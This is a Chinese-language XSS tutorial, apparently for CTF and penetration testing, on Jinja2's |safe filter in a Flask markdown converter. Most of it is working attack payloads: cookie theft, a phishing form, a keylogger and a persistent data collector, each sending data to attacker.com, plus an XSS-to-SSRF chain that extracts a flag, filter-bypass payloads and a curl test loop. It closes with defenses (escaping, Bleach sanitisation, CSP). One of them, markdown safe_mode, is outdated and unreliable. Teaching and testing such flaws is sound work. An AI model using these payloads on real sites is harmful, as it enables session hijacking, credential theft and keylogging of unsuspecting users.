# Jinja2 Safe 过滤器 XSS 攻击

## 1. 概述

### 1.1 漏洞原理

Jinja2 模板引擎默认启用 HTML 自动转义，但使用 `|safe` 过滤器会显式禁用转义，导致用户可控内容中的 HTML 标签和 JavaScript 代码被原样输出，从而产生 XSS 漏洞。

### 1.2 脆弱代码模式

**脆弱代码：**
```python
# Flask 应用
from flask import Flask, render_template, request
import markdown

app = Flask(__name__)

@app.route('/convert', methods=['POST'])
def convert():
    markdown_text = request.form.get('markdown_text')
    html_content = markdown.markdown(markdown_text)  # 保留原始 HTML
    return render_template('converter.html', html_content=html_content)
```

```html
<!-- converter.html 模板 -->
<div class="output">
    {{ html_content|safe }}  {# ⚠️ 危险：禁用 HTML 转义 #}
</div>
```

### 1.3 攻击条件

- 应用使用 Jinja2 模板引擎
- 模板中使用 `|safe` 过滤器渲染用户可控内容
- 内容经过 markdown 处理但保留原始 HTML
- 无 CSP 或其他 XSS 防护措施

---

## 2. 攻击场景

### 2.1 基础 XSS 攻击

**攻击 Payload：**
```html
<!-- 基础 Script 标签注入 -->
<script>alert('XSS')</script>

<!-- 图片错误处理注入 -->
<img src=x onerror=alert('XSS')>

<!-- SVG 注入 -->
<svg onload=alert('XSS')>

<!-- iframe 注入 -->
<iframe src="javascript:alert('XSS')"></iframe>
```

**利用步骤：**
```bash
# 通过 curl 发送恶意 markdown
curl -X POST http://target/convert \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'markdown_text=<img src=x onerror=alert(document.domain)>'
```

### 2.2 会话 Cookie 窃取

**前提条件：**
- 会话 Cookie 无 HttpOnly 标志
- 应用有认证系统

**攻击 Payload：**
```html
<script>
// 窃取 Cookie 并外带
fetch('https://attacker.com/steal?cookie=' + 
      encodeURIComponent(document.cookie));
</script>
```

**Markdown 输入：**
```markdown
# 我的笔记

<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### 2.3 钓鱼攻击

**攻击 Payload：**
```html
<script>
// 替换页面内容显示钓鱼表单
document.body.innerHTML = `
    <div style="text-align:center; margin-top:50px;">
        <h2>会话已过期，请重新登录</h2>
        <form action="https://attacker.com/phish" method="POST">
            <input type="text" name="username" placeholder="用户名" required><br><br>
            <input type="password" name="password" placeholder="密码" required><br><br>
            <button type="submit">登录</button>
        </form>
    </div>
`;
</script>
```

### 2.4 键盘记录器

**攻击 Payload：**
```html
<script>
// 记录所有键盘输入
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log?key=' + 
          encodeURIComponent(String.fromCharCode(e.which)));
});
</script>
```

---

## 3. 高级攻击技术

### 3.1 结合 SSRF 的组合攻击

**场景：** 应用同时存在 XSS 和 SSRF 漏洞

**攻击 Payload：**
```html
<script>
// 通过 SSRF 访问内部管理端点
fetch('/convert', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'url=http://127.0.0.1/admin/flag'
})
.then(r => r.text())
.then(html => {
    // 提取 Flag
    const flag = html.match(/flag\{[^}]+\}/)[0];
    
    // 外带 Flag
    fetch('https://attacker.com/exfil?flag=' + encodeURIComponent(flag));
    
    // 在页面显示
    document.body.innerHTML = '<h1>Flag: ' + flag + '</h1>';
});
</script>
```

**攻击流程：**
```
XSS Payload 注入
    ↓
JavaScript 执行
    ↓
发起 SSRF 请求到 /convert
    ↓
服务器访问 http://127.0.0.1/admin/flag
    ↓
IP 认证绕过，返回 Flag
    ↓
JavaScript 提取并外带
```

### 3.2 存储型 XSS 持久化攻击

**场景：** Markdown 内容被存储并展示给其他用户

**攻击步骤：**

1. **存储恶意内容**
   ```markdown
   # 技术分享
   
   <script>
   // 持久化后门
   setInterval(() => {
       fetch('/api/user/data')
           .then(r => r.json())
           .then(data => {
               fetch('https://attacker.com/collect', {
                   method: 'POST',
                   body: JSON.stringify(data)
               });
           });
   }, 60000); // 每分钟执行
   </script>
   ```

2. **受害者访问**
   - 管理员查看存储的 markdown
   - JavaScript 在管理员浏览器执行
   - 持续泄露数据

### 3.3 绕过内容过滤

**场景：** 应用过滤了部分危险标签

**绕过技术：**

| 过滤规则 | 绕过方法 | Payload 示例 |
|---------|---------|-------------|
| 过滤 `<script>` | 使用 `<svg>` | `<svg onload=alert(1)>` |
| 过滤 `onerror` | 使用 `onload` | `<svg onload=alert(1)>` |
| 过滤 `alert` | 使用 `confirm/prompt` | `<img src=x onerror=confirm(1)>` |
| 过滤空格 | 使用 Tab/换行 | `<svg/onload=alert(1)>` |
| 过滤引号 | 使用反引号 | `` `<img/src=x onerror=alert(1)>` `` |

**Markdown 特殊语法绕过：**
```markdown
<!-- 使用 HTML 注释绕过 -->
<img src=x onerror=<!-- -->alert(1)>

<!-- 使用 CDATA -->
<![CDATA[<script>alert(1)</script>]]>
```

---

## 4. 检测与验证

### 4.1 自动化检测

**Payload 列表：**
```
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<script>alert('XSS')</script>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

**检测工具：**
```bash
# 使用 curl 测试
for payload in '<img src=x onerror=alert(1)>' \
               '<svg onload=alert(1)>' \
               '<script>alert(1)</script>'; do
    echo "Testing: $payload"
    curl -X POST http://target/convert \
         -d "markdown_text=$payload" | grep -o '<script>'
done
```

### 4.2 手动验证

**步骤 1：基础测试**
```markdown
输入：<img src=x onerror=alert('XSS-TEST')>
预期：弹出 alert 对话框
```

**步骤 2：确认执行上下文**
```html
<script>
alert('Domain: ' + document.domain);
alert('Cookie: ' + document.cookie);
</script>
```

**步骤 3：验证持久性**
- 刷新页面确认是否持续执行
- 检查是否为存储型 XSS

---

## 5. 防御措施

### 5.1 移除 |safe 过滤器

**脆弱代码：**
```html
{{ html_content|safe }}
```

**修复代码：**
```html
<!-- 方案 1：启用自动转义 -->
{{ html_content }}

<!-- 方案 2：使用 escape 过滤器 -->
{{ html_content|escape }}
```

### 5.2 HTML 净化

**使用 Bleach 库：**
```python
import bleach
from markdown import markdown

@app.route('/convert', methods=['POST'])
def convert():
    markdown_text = request.form.get('markdown_text')
    
    # 转换为 HTML
    html_content = markdown(markdown_text)
    
    # 净化 HTML，只允许安全标签
    allowed_tags = ['p', 'br', 'strong', 'em', 'ul', 'li', 'h1', 'h2', 'h3']
    allowed_attrs = {'a': ['href', 'title']}
    clean_html = bleach.clean(
        html_content, 
        tags=allowed_tags, 
        attributes=allowed_attrs,
        strip=True
    )
    
    return render_template('converter.html', html_content=clean_html)
```

### 5.3 配置 Markdown 安全模式

```python
import markdown

# 使用 safe_mode 移除 HTML
html_content = markdown.markdown(
    markdown_text,
    safe_mode='escape'  # 转义所有 HTML
)

# 或使用 extensions
html_content = markdown.markdown(
    markdown_text,
    extensions=['fenced_code', 'tables'],
    output_format='html5'
)
```

### 5.4 实施 CSP

```python
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "frame-ancestors 'none'"
    )
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response
```

---

## 6. 攻击案例总结

| 案例 | 脆弱点 | Payload | 影响 |
|------|-------|---------|------|
| Flask Markdown 转换器 | `{{ html_content\|safe }}` | `<img src=x onerror=fetch()>` | Flag 泄露 |
| 博客系统 | 文章存储 + `|safe` | `<script>steal()</script>` | 管理员 Cookie 泄露 |
| 文档管理系统 | 评论功能 + `|safe` | `<svg onload=keylog()>` | 键盘记录 |

---

## 7. 参考资源

- [Jinja2 Security](https://jinja.palletsprojects.com/en/3.0.x/sandbox/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Bleach Documentation](https://bleach.readthedocs.io/)

---

**文档版本：** 1.0  
**最后更新：** 2026 年 3 月  
**适用场景：** CTF 挑战、渗透测试、安全审计
